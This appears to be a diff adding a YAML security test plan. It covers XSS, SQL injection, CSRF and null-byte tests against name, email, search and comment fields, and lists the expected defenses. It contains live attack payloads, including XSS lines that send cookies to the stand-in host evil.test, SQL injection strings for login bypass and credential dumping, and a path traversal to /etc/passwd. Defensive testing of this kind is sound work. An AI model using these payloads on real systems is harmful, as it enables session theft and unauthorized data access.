@@ -1,0 +1,736 @@
+###############################################################################
+# Comprehensive Web Application Security Test Plan
+#
+# Target: Web application user input fields (name, email, search, comment)
+# Attack Vectors: XSS, SQL Injection, CSRF, Null Byte Injection
+# Date: 2026-03-14
+###############################################################################
+
+metadata:
+  plan_name: "Web Application Input Field Security Test Plan"
+  version: "1.0"
+  created: "2026-03-14"
+  scope: "All user-facing input fields: name, email, search, comment"
+  objective: >
+    Validate that the application correctly defends against XSS, SQL injection,
+    CSRF, and null byte injection attacks across every user input surface.
+
+input_fields:
+  - field_id: name
+    description: "User display name / registration name field"
+    max_length: 255
+    html_element: "input[type=text]"
+  - field_id: email
+    description: "User email address field"
+    max_length: 254
+    html_element: "input[type=email]"
+  - field_id: search
+    description: "Site-wide search query field"
+    max_length: 512
+    html_element: "input[type=text]"
+  - field_id: comment
+    description: "User comment / feedback textarea"
+    max_length: 5000
+    html_element: "textarea"
+
+###############################################################################
+# 1. CROSS-SITE SCRIPTING (XSS)
+###############################################################################
+xss_tests:
+  description: >
+    Tests for reflected, stored, and DOM-based XSS. Each payload attempts to
+    execute arbitrary JavaScript in the victim's browser. The application must
+    sanitize, encode, or reject every payload.
+
+  # ---- Reflected XSS ----
+  reflected_xss:
+    - test_id: XSS-REFL-001
+      name: "Basic script tag injection via search"
+      attack_type: reflected
+      input_field: search
+      payload: '<script>alert("XSS")</script>'
+      delivery: "GET /search?q=<script>alert(\"XSS\")</script>"
+      description: >
+        Injects a plain script tag into the search query parameter. If the
+        search term is reflected in the results page without encoding, the
+        script executes in the user's browser.
+      expected_defense:
+        action: "HTML-entity encode output"
+        sanitized_output: '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;'
+        http_status: 200
+        response_headers:
+          Content-Type: "text/html; charset=utf-8"
+          X-Content-Type-Options: "nosniff"
+          X-XSS-Protection: "0"
+          Content-Security-Policy: "script-src 'self'"
+        notes: >
+          The literal text should appear safely rendered on the page with all
+          angle brackets and quotes entity-encoded. No script execution occurs.
+
+    - test_id: XSS-REFL-002
+      name: "Event handler injection via name field"
+      attack_type: reflected
+      input_field: name
+      payload: '"><img src=x onerror=alert(document.cookie)>'
+      delivery: "POST /profile/update  body: name=\"><img src=x onerror=alert(document.cookie)>"
+      description: >
+        Breaks out of an HTML attribute using a closing quote and angle bracket,
+        then injects an img tag whose onerror fires JavaScript.
+      expected_defense:
+        action: "Reject input or HTML-entity encode"
+        sanitized_output: '&quot;&gt;&lt;img src=x onerror=alert(document.cookie)&gt;'
+        http_status: 200
+        error_message: null
+        notes: >
+          If the application uses an allowlist validator for names, it should
+          reject the input with a 422 status. Otherwise the output must be
+          fully entity-encoded so no tag is created.
+        alternative_response:
+          http_status: 422
+          error_message: "Name contains invalid characters."
+
+    - test_id: XSS-REFL-003
+      name: "SVG-based XSS via search"
+      attack_type: reflected
+      input_field: search
+      payload: '<svg/onload=fetch("https://evil.test/steal?c="+document.cookie)>'
+      delivery: "GET /search?q=<svg/onload=fetch(\"https://evil.test/steal?c=\"+document.cookie)>"
+      description: >
+        Uses an SVG element with an onload event to exfiltrate cookies to an
+        attacker-controlled server. Tests whether the application strips
+        dangerous SVG attributes.
+      expected_defense:
+        action: "HTML-entity encode all output"
+        sanitized_output: '&lt;svg/onload=fetch(&quot;https://evil.test/steal?c=&quot;+document.cookie)&gt;'
+        http_status: 200
+        notes: >
+          The SVG tag must not render as an element. All angle brackets and
+          quotes are entity-encoded in the reflected output.
+
+  # ---- Stored XSS ----
+  stored_xss:
+    - test_id: XSS-STOR-001
+      name: "Stored script injection via comment field"
+      attack_type: stored
+      input_field: comment
+      payload: '<script>new Image().src="https://evil.test/log?c="+document.cookie;</script>'
+      delivery: "POST /comments  body: comment=<script>new Image().src=\"https://evil.test/log?c=\"+document.cookie;</script>"
+      description: >
+        Submits a comment containing a script tag that exfiltrates cookies.
+        If stored without sanitization, every user viewing the comment page
+        will execute the payload.
+      expected_defense:
+        action: "Sanitize on input and encode on output"
+        sanitized_output: "&lt;script&gt;new Image().src=&quot;https://evil.test/log?c=&quot;+document.cookie;&lt;/script&gt;"
+        http_status: 201
+        stored_value: >
+          The database should store a sanitized or plain-text version. On
+          retrieval, contextual output encoding must be applied.
+        notes: >
+          Defense-in-depth: input sanitization removes script tags at write
+          time; output encoding prevents execution at render time.
+
+    - test_id: XSS-STOR-002
+      name: "Polyglot XSS payload via comment field"
+      attack_type: stored
+      input_field: comment
+      payload: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1) )//%%0telerik0telerik11telerik/telerik/oNcliCk=alert(1)//'>%22%3E%3Csvg%20telerik%3D'1'%20OnLoad%3D'alert(1)'%3E"
+      delivery: "POST /comments  body: comment=jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1) )//..."
+      description: >
+        A polyglot payload designed to bypass multiple parser contexts
+        (JavaScript, HTML attribute, URL). Tests the robustness of the
+        sanitizer against mixed-context injection.
+      expected_defense:
+        action: "Reject or fully encode"
+        http_status: 422
+        error_message: "Comment contains potentially unsafe content."
+        notes: >
+          A WAF or input validation layer should flag this as malicious. If
+          accepted, every special character must be entity-encoded on output.
+
+  # ---- DOM-based XSS ----
+  dom_based_xss:
+    - test_id: XSS-DOM-001
+      name: "DOM XSS via URL fragment in search"
+      attack_type: dom_based
+      input_field: search
+      payload: '#<img src=x onerror=alert(1)>'
+      delivery: "GET /search#<img src=x onerror=alert(1)>"
+      description: >
+        Exploits client-side JavaScript that reads location.hash and injects
+        it into the DOM via innerHTML or document.write. The fragment is not
+        sent to the server, so server-side filters do not see it.
+      expected_defense:
+        action: "Client-side: use textContent instead of innerHTML; apply CSP"
+        http_status: 200
+        response_headers:
+          Content-Security-Policy: "script-src 'self'; object-src 'none'"
+        notes: >
+          The application's JavaScript must never use innerHTML with
+          unsanitized fragment data. A strict CSP blocks inline script
+          execution as a secondary defense.
+
+    - test_id: XSS-DOM-002
+      name: "DOM XSS via search query parameter consumed client-side"
+      attack_type: dom_based
+      input_field: search
+      payload: '"><svg onload=alert(document.domain)>'
+      delivery: "GET /search?q=\"><svg onload=alert(document.domain)>"
+      description: >
+        Targets client-side code that extracts the q parameter via
+        URLSearchParams and writes it to the page without sanitization.
+      expected_defense:
+        action: "Use safe DOM APIs (textContent) and enforce CSP"
+        http_status: 200
+        sanitized_output: '&quot;&gt;&lt;svg onload=alert(document.domain)&gt;'
+        response_headers:
+          Content-Security-Policy: "script-src 'self'; object-src 'none'"
+        notes: >
+          Even if the server reflects the value safely, client-side JS must
+          also treat query parameters as untrusted data.
+
+###############################################################################
+# 2. SQL INJECTION
+###############################################################################
+sql_injection_tests:
+  description: >
+    Tests for classic, blind, and UNION-based SQL injection. The application
+    must use parameterized queries (prepared statements) so that user input is
+    never concatenated into SQL strings.
+
+  # ---- Authentication Bypass ----
+  authentication_bypass:
+    - test_id: SQLI-AUTH-001
+      name: "Classic OR-based authentication bypass via email"
+      attack_type: authentication_bypass
+      input_field: email
+      payload: "' OR '1'='1' --"
+      delivery: "POST /login  body: email=' OR '1'='1' --&password=anything"
+      description: >
+        Attempts to short-circuit the WHERE clause in a login query such as
+        SELECT * FROM users WHERE email='INPUT' AND password='INPUT'. If
+        the email value is concatenated, the tautology '1'='1' returns all
+        rows, bypassing authentication.
+      expected_defense:
+        action: "Parameterized query; input never reaches SQL parser"
+        http_status: 401
+        error_message: "Invalid email or password."
+        notes: >
+          The query uses a bind parameter for the email value, so the literal
+          string "' OR '1'='1' --" is compared against stored emails. No
+          match is found and authentication fails normally.
+
+    - test_id: SQLI-AUTH-002
+      name: "Admin bypass via UNION injection in email"
+      attack_type: authentication_bypass
+      input_field: email
+      payload: "admin'--"
+      delivery: "POST /login  body: email=admin'--&password=anything"
+      description: >
+        Attempts to comment out the password check by injecting a single quote
+        and SQL comment after a known username, transforming the query to
+        SELECT * FROM users WHERE email='admin'-- AND password='anything'.
+      expected_defense:
+        action: "Parameterized query prevents interpretation"
+        http_status: 401
+        error_message: "Invalid email or password."
+        notes: >
+          With parameterized queries, the single quote and double dash are
+          treated as literal characters in the email value comparison.
+
+  # ---- Data Exfiltration ----
+  data_exfiltration:
+    - test_id: SQLI-EXFIL-001
+      name: "UNION SELECT to extract user table via search"
+      attack_type: data_exfiltration
+      input_field: search
+      payload: "' UNION SELECT username, password, email, NULL FROM users --"
+      delivery: "GET /search?q=' UNION SELECT username, password, email, NULL FROM users --"
+      description: >
+        Appends a UNION SELECT to the search query to extract credentials
+        from the users table. Requires knowing (or guessing) column count
+        and table/column names.
+      expected_defense:
+        action: "Parameterized query; return zero search results"
+        http_status: 200
+        error_message: null
+        search_results: []
+        notes: >
+          The entire payload is treated as a search term literal. The query
+          returns no matching records. No database schema is leaked.
+
+    - test_id: SQLI-EXFIL-002
+      name: "Stacked query to dump schema via comment field"
+      attack_type: data_exfiltration
+      input_field: comment
+      payload: "'; SELECT table_name FROM information_schema.tables; --"
+      delivery: "POST /comments  body: comment='; SELECT table_name FROM information_schema.tables; --"
+      description: >
+        Attempts to terminate the INSERT statement and execute a second query
+        to enumerate all database tables via information_schema.
+      expected_defense:
+        action: "Parameterized query; comment stored as literal text"
+        http_status: 201
+        stored_value: "'; SELECT table_name FROM information_schema.tables; --"
+        notes: >
+          The comment is stored verbatim as text. The semicolon and second
+          query are never executed. Most database drivers also reject stacked
+          queries by default.
+
+  # ---- Blind SQL Injection ----
+  blind_injection:
+    - test_id: SQLI-BLIND-001
+      name: "Boolean-based blind injection via search"
+      attack_type: blind_injection
+      input_field: search
+      payload: "test' AND 1=1 --"
+      delivery: "GET /search?q=test' AND 1=1 --"
+      description: >
+        Tests whether appending a true condition changes the result set. If
+        the results for AND 1=1 differ from AND 1=2, the field is injectable.
+      expected_defense:
+        action: "Parameterized query; identical empty response for both"
+        http_status: 200
+        search_results: []
+        notes: >
+          Both "test' AND 1=1 --" and "test' AND 1=2 --" must return the
+          same response (no results), confirming the input is not interpreted
+          as SQL.
+      verification:
+        secondary_payload: "test' AND 1=2 --"
+        expected_behavior: "Response body and result count identical to primary payload"
+
+    - test_id: SQLI-BLIND-002
+      name: "Time-based blind injection via name field"
+      attack_type: blind_injection
+      input_field: name
+      payload: "test'; WAITFOR DELAY '0:0:5'; --"
+      delivery: "POST /profile/update  body: name=test'; WAITFOR DELAY '0:0:5'; --"
+      description: >
+        Injects a time delay (SQL Server syntax). If the response takes 5+
+        seconds, the injection point is confirmed. Also tests MySQL variant:
+        test' AND SLEEP(5) --
+      expected_defense:
+        action: "Parameterized query; no delay observed"
+        http_status: 200
+        max_response_time_ms: 1000
+        notes: >
+          The response time must be consistent with normal processing (under
+          1 second). No delay is introduced because the WAITFOR/SLEEP is
+          never executed as SQL.
+      mysql_variant:
+        payload: "test' AND SLEEP(5) --"
+        expected_behavior: "Same as primary: no delay, normal response time"
+
+    - test_id: SQLI-BLIND-003
+      name: "Error-based injection via email field"
+      attack_type: blind_injection
+      input_field: email
+      payload: "test'@test.com"
+      delivery: "POST /register  body: email=test'@test.com&name=Test&password=Pass123!"
+      description: >
+        Inserts a single quote into an otherwise valid-looking email. If the
+        application returns a database error (e.g., syntax error near...),
+        it reveals the injection point and potentially the database engine.
+      expected_defense:
+        action: "Input validation rejects malformed email; no DB error leaked"
+        http_status: 422
+        error_message: "Please enter a valid email address."
+        notes: >
+          Email format validation should reject the input before it reaches
+          any database query. Even if it passed validation, the parameterized
+          query would treat the quote as a literal character. No internal
+          error details are ever returned to the client.
+
+###############################################################################
+# 3. CROSS-SITE REQUEST FORGERY (CSRF)
+###############################################################################
+csrf_tests:
+  description: >
+    Tests that state-changing requests require a valid, unpredictable CSRF
+    token, enforce SameSite cookie attributes, and validate the Origin/Referer
+    header. An attacker hosting a malicious page should not be able to forge
+    requests on behalf of an authenticated user.
+
+  token_validation:
+    - test_id: CSRF-TOKEN-001
+      name: "Submit form without CSRF token"
+      target_endpoint: "POST /profile/update"
+      input_field: name
+      attack_description: >
+        The attacker's page submits a form to /profile/update without
+        including the CSRF token field. Tests whether the server rejects
+        requests missing the token entirely.
+      payload:
+        method: POST
+        headers:
+          Content-Type: "application/x-www-form-urlencoded"
+          Cookie: "session=valid_session_cookie"
+        body: "name=Attacker&email=attacker@evil.test"
+        csrf_token: null
+      expected_defense:
+        http_status: 403
+        error_message: "CSRF token missing or invalid."
+        side_effect: "No profile data is modified."
+        notes: >
+          The server must check for the token's presence before processing
+          any state-changing request.
+
+    - test_id: CSRF-TOKEN-002
+      name: "Submit form with invalid/forged CSRF token"
+      target_endpoint: "POST /profile/update"
+      input_field: name
+      attack_description: >
+        The attacker guesses or fabricates a CSRF token value. Tests whether
+        the server validates the token against the user's session.
+      payload:
+        method: POST
+        headers:
+          Content-Type: "application/x-www-form-urlencoded"
+          Cookie: "session=valid_session_cookie"
+        body: "name=Attacker&email=attacker@evil.test&csrf_token=forged_token_abc123"
+        csrf_token: "forged_token_abc123"
+      expected_defense:
+        http_status: 403
+        error_message: "CSRF token missing or invalid."
+        side_effect: "No profile data is modified."
+        notes: >
+          The server must compare the submitted token to the one stored in
+          the user's session. Forged tokens must not pass validation.
+
+    - test_id: CSRF-TOKEN-003
+      name: "Reuse expired CSRF token"
+      target_endpoint: "POST /comments"
+      input_field: comment
+      attack_description: >
+        An attacker captures a previously valid CSRF token and attempts to
+        use it after it has expired or been rotated.
+      payload:
+        method: POST
+        headers:
+          Content-Type: "application/x-www-form-urlencoded"
+          Cookie: "session=valid_session_cookie"
+        body: "comment=Malicious+comment&csrf_token=previously_valid_expired_token"
+        csrf_token: "previously_valid_expired_token"
+      expected_defense:
+        http_status: 403
+        error_message: "CSRF token missing or invalid."
+        side_effect: "No comment is created."
+        notes: >
+          Tokens should have a limited lifetime. Once rotated or expired,
+          old tokens must be rejected.
+
+  samesite_cookie_enforcement:
+    - test_id: CSRF-COOKIE-001
+      name: "Cross-origin POST with SameSite=Lax cookie"
+      target_endpoint: "POST /profile/update"
+      input_field: name
+      attack_description: >
+        A form hosted on https://evil.test auto-submits a POST request to
+        the application. With SameSite=Lax, the session cookie should not
+        be sent on cross-origin POST requests.
+      payload:
+        origin: "https://evil.test"
+        method: POST
+        body: "name=Hacked"
+        cookie_samesite_attribute: "Lax"
+      expected_defense:
+        cookie_sent: false
+        http_status: 401
+        error_message: "Authentication required."
+        side_effect: "No profile data is modified."
+        notes: >
+          SameSite=Lax blocks cookies on cross-origin POST. The request
+          arrives unauthenticated and is rejected.
+
+    - test_id: CSRF-COOKIE-002
+      name: "Cross-origin GET that triggers state change with SameSite=Lax"
+      target_endpoint: "GET /account/delete?confirm=true"
+      input_field: null
+      attack_description: >
+        Tests that state-changing operations are never performed via GET.
+        SameSite=Lax allows cookies on cross-origin GET navigations, so
+        relying solely on SameSite=Lax is insufficient if GET endpoints
+        modify state.
+      payload:
+        origin: "https://evil.test"
+        method: GET
+        delivery: '<img src="https://target.test/account/delete?confirm=true">'
+      expected_defense:
+        http_status: 405
+        error_message: "Method not allowed."
+        side_effect: "Account is not deleted."
+        notes: >
+          State-changing actions must require POST/PUT/DELETE with CSRF
+          tokens. GET requests must be idempotent and safe.
+
+    - test_id: CSRF-COOKIE-003
+      name: "Verify SameSite=Strict blocks all cross-site requests"
+      target_endpoint: "POST /settings/change-password"
+      input_field: null
+      attack_description: >
+        With SameSite=Strict, no cookies are sent on any cross-origin
+        request (including top-level navigations). Verifies the strictest
+        cookie policy is applied to sensitive endpoints.
+      payload:
+        origin: "https://evil.test"
+        method: POST
+        body: "new_password=hacked123"
+        cookie_samesite_attribute: "Strict"
+      expected_defense:
+        cookie_sent: false
+        http_status: 401
+        error_message: "Authentication required."
+        side_effect: "Password is not changed."
+        notes: >
+          Sensitive endpoints (password change, email change, account
+          deletion) should use SameSite=Strict cookies.
+
+  referrer_and_origin_checking:
+    - test_id: CSRF-REF-001
+      name: "Cross-origin request with mismatched Origin header"
+      target_endpoint: "POST /profile/update"
+      input_field: name
+      attack_description: >
+        The request includes an Origin header pointing to the attacker's
+        domain. The server must reject requests from untrusted origins.
+      payload:
+        method: POST
+        headers:
+          Origin: "https://evil.test"
+          Referer: "https://evil.test/attack.html"
+          Content-Type: "application/x-www-form-urlencoded"
+          Cookie: "session=valid_session_cookie"
+        body: "name=Hacked&csrf_token=valid_token"
+      expected_defense:
+        http_status: 403
+        error_message: "Origin not allowed."
+        side_effect: "No profile data is modified."
+        notes: >
+          The server should verify the Origin header matches the expected
+          domain. This is a defense-in-depth measure alongside CSRF tokens.
+
+    - test_id: CSRF-REF-002
+      name: "Request with suppressed Origin and Referer headers"
+      target_endpoint: "POST /profile/update"
+      input_field: name
+      attack_description: >
+        Uses Referrer-Policy: no-referrer or meta tag to strip both Origin
+        and Referer headers. Tests whether the server defaults to deny when
+        origin information is absent.
+      payload:
+        method: POST
+        headers:
+          Origin: null
+          Referer: null
+          Content-Type: "application/x-www-form-urlencoded"
+          Cookie: "session=valid_session_cookie"
+        body: "name=Hacked&csrf_token=valid_token"
+      expected_defense:
+        http_status: 403
+        error_message: "Origin validation failed."
+        side_effect: "No profile data is modified."
+        notes: >
+          When both Origin and Referer are absent, the server should reject
+          the request. Never default to allow when origin cannot be verified.
+
+###############################################################################
+# 4. NULL BYTE INJECTION
+###############################################################################
+null_byte_injection_tests:
+  description: >
+    Null byte (\x00 / %00) injection exploits differences in how languages
+    handle null-terminated strings. It can bypass file extension checks,
+    truncate log entries, and enable path traversal.
+
+  file_upload_path_traversal:
+    - test_id: NULL-FILE-001
+      name: "Null byte to bypass file extension validation"
+      input_field: name
+      context: "File upload - filename field"
+      payload: "malicious.php%00.jpg"
+      delivery: >
+        POST /upload
+        Content-Disposition: form-data; name="avatar"; filename="malicious.php%00.jpg"
+      description: >
+        The application validates that uploaded files end in .jpg. The null
+        byte causes the filesystem (in vulnerable runtimes) to truncate the
+        filename to malicious.php, allowing server-side code execution.
+      expected_defense:
+        action: "Strip or reject null bytes; validate MIME type independently"
+        http_status: 422
+        error_message: "Invalid filename. Null bytes are not permitted."
+        side_effect: "File is not saved to disk."
+        notes: >
+          The server must reject any filename containing %00 or \x00.
+          Additionally, file type validation should check MIME magic bytes,
+          not just the extension.
+
+    - test_id: NULL-FILE-002
+      name: "Path traversal with null byte in filename"
+      input_field: name
+      context: "File upload - filename field"
+      payload: "../../../etc/passwd%00.png"
+      delivery: >
+        POST /upload
+        Content-Disposition: form-data; name="avatar"; filename="../../../etc/passwd%00.png"
+      description: >
+        Combines directory traversal (../) with null byte truncation to
+        attempt reading or overwriting system files. The .png suffix
+        satisfies extension validation, but the null byte truncates it.
+      expected_defense:
+        action: "Reject path traversal sequences and null bytes; use basename only"
+        http_status: 422
+        error_message: "Invalid filename. Path traversal sequences are not permitted."
+        side_effect: "No file is read or written outside the upload directory."
+        notes: >
+          The server must: (1) reject null bytes, (2) reject ../ sequences,
+          (3) extract only the basename from the filename, (4) generate a
+          random filename for storage rather than using user input.
+
+    - test_id: NULL-FILE-003
+      name: "Null byte in upload path parameter"
+      input_field: name
+      context: "File upload - target directory parameter"
+      payload: "/uploads/avatars%00/../../tmp/"
+      delivery: "POST /upload?dir=/uploads/avatars%00/../../tmp/"
+      description: >
+        Injects a null byte into a directory path parameter, attempting to
+        truncate the path and redirect file storage to an attacker-controlled
+        location.
+      expected_defense:
+        action: "Ignore user-supplied directory; use server-configured path"
+        http_status: 400
+        error_message: "Invalid request parameter."
+        side_effect: "File is not saved."
+        notes: >
+          Upload destination directories should never be user-controllable.
+          If a directory parameter is used internally, null bytes and traversal
+          sequences must be stripped.
+
+  log_injection:
+    - test_id: NULL-LOG-001
+      name: "Null byte log injection via name field"
+      input_field: name
+      context: "Application logging"
+      payload: "legitimate_user%00\nINFO: Admin logged in from 127.0.0.1"
+      delivery: "POST /register  body: name=legitimate_user%00%0AINFO: Admin logged in from 127.0.0.1"
+      description: >
+        Injects a null byte followed by a newline and a fake log entry into
+        the name field. If the application logs the name without sanitization,
+        the fake entry appears as a legitimate log line, potentially hiding
+        malicious activity or framing another user.
+      expected_defense:
+        action: "Strip null bytes and encode newlines in log output"
+        http_status: 200
+        stored_name: "legitimate_user"
+        log_output: 'User registered: legitimate_user\nINFO: Admin logged in from 127.0.0.1 [SANITIZED]'
+        notes: >
+          The application must: (1) strip null bytes from all input,
+          (2) replace or encode newlines (CR, LF) in values written to logs,
+          (3) use structured logging (JSON) to prevent log line injection.
+        structured_log_example:
+          level: "INFO"
+          message: "User registered"
+          username: "legitimate_user\\u0000\\nINFO: Admin logged in from 127.0.0.1"
+
+    - test_id: NULL-LOG-002
+      name: "Null byte log truncation via comment field"
+      input_field: comment
+      context: "Application logging"
+      payload: "Normal comment%00HIDDEN MALICIOUS PAYLOAD"
+      delivery: "POST /comments  body: comment=Normal comment%00HIDDEN MALICIOUS PAYLOAD"
+      description: >
+        Uses a null byte to truncate the logged value, hiding the remainder
+        of the input from log-based monitoring and intrusion detection systems.
+        The full payload (including the malicious portion) may still be
+        processed by the application.
+      expected_defense:
+        action: "Strip null bytes; log and store the complete sanitized value"
+        http_status: 201
+        stored_value: "Normal commentHIDDEN MALICIOUS PAYLOAD"
+        log_output: "Comment created: Normal commentHIDDEN MALICIOUS PAYLOAD"
+        notes: >
+          After stripping null bytes, the entire input is visible to both
+          the storage layer and the logging system. No content is hidden from
+          monitoring.
+
+    - test_id: NULL-LOG-003
+      name: "Null byte in email field to bypass validation"
+      input_field: email
+      context: "Registration with email validation"
+      payload: "user@legit.com%00@evil.test"
+      delivery: "POST /register  body: email=user@legit.com%00@evil.test"
+      description: >
+        Attempts to pass email validation using the legit domain (before
+        the null byte) while the backend might process the evil domain
+        (after the null byte) in certain string handling scenarios.
+      expected_defense:
+        action: "Strip null bytes; re-validate the resulting email"
+        http_status: 422
+        error_message: "Please enter a valid email address."
+        notes: >
+          After removing the null byte, the resulting string
+          user@legit.com@evil.test is not a valid email address and fails
+          format validation.
+
+###############################################################################
+# EXECUTION GUIDELINES
+###############################################################################
+execution_guidelines:
+  prerequisites:
+    - "All tests must be run in a staging or test environment, never in production."
+    - "Obtain written authorization before executing any test."
+    - "Ensure database backups are available before running stored injection tests."
+    - "Configure a test WAF/IDS to verify detection rules independently."
+
+  test_execution_order:
+    - phase: 1
+      name: "Reconnaissance"
+      steps:
+        - "Map all input fields and their rendering contexts (HTML, JS, URL, CSS)."
+        - "Identify which fields are reflected, stored, or consumed client-side."
+        - "Document the technology stack (language, framework, database, ORM)."
+    - phase: 2
+      name: "XSS Testing"
+      steps:
+        - "Execute all XSS-REFL tests and verify output encoding."
+        - "Execute all XSS-STOR tests and check both storage and rendering."
+        - "Execute all XSS-DOM tests using browser developer tools."
+        - "Verify CSP headers are present and correctly configured."
+    - phase: 3
+      name: "SQL Injection Testing"
+      steps:
+        - "Execute SQLI-AUTH tests against login/registration endpoints."
+        - "Execute SQLI-EXFIL tests against search and comment endpoints."
+        - "Execute SQLI-BLIND tests and measure response time/content differences."
+        - "Confirm parameterized queries are used (code review)."
+    - phase: 4
+      name: "CSRF Testing"
+      steps:
+        - "Execute CSRF-TOKEN tests from a separate origin."
+        - "Execute CSRF-COOKIE tests and inspect Set-Cookie headers."
+        - "Execute CSRF-REF tests with manipulated Origin/Referer headers."
+    - phase: 5
+      name: "Null Byte Injection Testing"
+      steps:
+        - "Execute NULL-FILE tests against upload endpoints."
+        - "Execute NULL-LOG tests and inspect log files for injected entries."
+        - "Verify null byte stripping in all input processing pipelines."
+
+  pass_fail_criteria:
+    pass: >
+      A test PASSES (defense validated) when the application responds with the
+      expected HTTP status code, error message, or sanitized output as specified
+      in expected_defense, and no malicious side effect occurs.
+    fail: >
+      A test FAILS (vulnerability confirmed) when the payload achieves its
+      intended effect: script execution (XSS), unauthorized data access (SQLi),
+      successful cross-origin state change (CSRF), or file system manipulation
+      (null byte injection).
+
+  reporting:
+    - "Document each test result with test_id, pass/fail, actual response, and screenshots."
+    - "For failures, assign severity (Critical/High/Medium/Low) using CVSS 3.1."
+    - "Include remediation recommendations referencing OWASP guidelines."
+    - "Re-test all failures after remediation to confirm fixes."
